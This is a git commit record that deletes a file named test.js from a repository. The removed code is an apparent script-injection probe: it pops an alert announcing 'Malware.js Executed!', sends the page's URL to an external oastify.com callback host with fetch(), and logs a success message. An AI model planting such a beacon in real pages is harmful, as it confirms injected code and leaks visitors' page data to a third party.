70b384909591c34b4506f13773974fb041eea331
xXyouknowxX <101567079+xXyouknowxX@users.noreply.github.com>
2025-02-10 11:04:20 +0100

    Delete test.js

--- test.js
+++
@@ -1,9 +0,0 @@
-// Simple test script to confirm execution
-alert("✅ Malware.js Executed!");
-
-// Send execution confirmation to an external server
-fetch("https://kj7dvxugl70erzrg71gi5b91lsrjfg35.oastify.com/execution?success=true&location=" + encodeURIComponent(window.location.href));
-
-
-// Log execution in console (for debugging)
-console.log("🚀 malware.js successfully injected and executed.");
